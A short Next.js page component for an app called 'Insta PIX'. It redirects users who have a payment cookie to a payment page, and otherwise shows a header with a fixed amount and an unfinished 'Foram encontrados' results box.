
import { NewHeader } from "@/components/new-header";
import { hasCookieT } from "@/functions/get-cookie";
import { redirect } from "next/navigation";

export default async function VerifyPage() {

  const cookie = await hasCookieT('user_set_payment')

  if (cookie) {
    redirect('/app/pagamento')
  }

  const question_1 = hasCookieT('question_1')
  const question_2 = hasCookieT('question_2')
  const question_3 = hasCookieT('question_3')
  const question_4 = hasCookieT('question_4')
  const question_5 = hasCookieT('question_5')


  return (
    <>
      <NewHeader amount={2819.99} />

      <div className="flex flex-col mt-[20px] p-5">


        <div className="bg-white rounded-lg w-full p-5">
          <p>Foram encontrados</p>
        </div>


      </div>

      <div className="text-zinc-600 text-sm text-center">
        2024 &copy; Insta PIX
      </div>

    </>
  )
}